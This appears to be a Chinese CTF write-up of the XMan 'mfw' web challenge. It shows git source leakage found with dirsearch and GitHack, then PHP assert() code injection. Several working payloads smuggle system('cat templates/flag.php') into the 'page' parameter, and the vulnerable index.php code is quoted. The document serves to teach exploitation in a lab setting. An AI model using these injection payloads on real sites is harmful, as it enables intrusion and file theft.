## XMan Web-mfw

**工具：**GitHack,dirsearch**知识点：**

打开题目场景，检查网站，发现这样一个页面





![img](https:////upload-images.jianshu.io/upload_images/10148719-fa13e01ee3cb7eef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/493/format/webp)

image.png



访问.git目录，疑似存在git源码泄露





![img](https:////upload-images.jianshu.io/upload_images/10148719-aebb660b0ea56299.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/600/format/webp)

image.png

再用dirsearch扫描，发现git源码泄露：





![img](https:////upload-images.jianshu.io/upload_images/10148719-726ff091784a3cd6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/737/format/webp)





使用 GitHack获取源码





![img](https:////upload-images.jianshu.io/upload_images/10148719-981c9e67174c1c70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/733/format/webp)




 得到源码



![img](https:////upload-images.jianshu.io/upload_images/10148719-af36984307dc5e63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/276/format/webp)





index.php中关键代码如下

```php
<?php

if (isset($_GET['page'])) {
    $page = $_GET['page'];
} else {
    $page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

如果这个字符串中没有找到相应的子字符串 就返回false
// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
assert() 检查一个断言是否为 FALSE
strpos() 函数查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False
file_exists() 函数检查文件或目录是否存在。
assert()函数会将括号中的字符当成代码来执行，并返回true或false。
```

payload:`?page=abc') or system("cat templates/flag.php");//`

$file =templates/ abc') or system("cat templates/flag.php");// ".php"
 因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用" // "将后面的语句注释掉
 查看网页源代码





![img](https:////upload-images.jianshu.io/upload_images/10148719-9fec8909c4296d17.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/768/format/webp)



其它payload:

  about.php', '123') === false and system('cat templates/flag.php') and strpos('templates/flag



flag','..')+or+system('cat+templates/flag.php');// 

assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉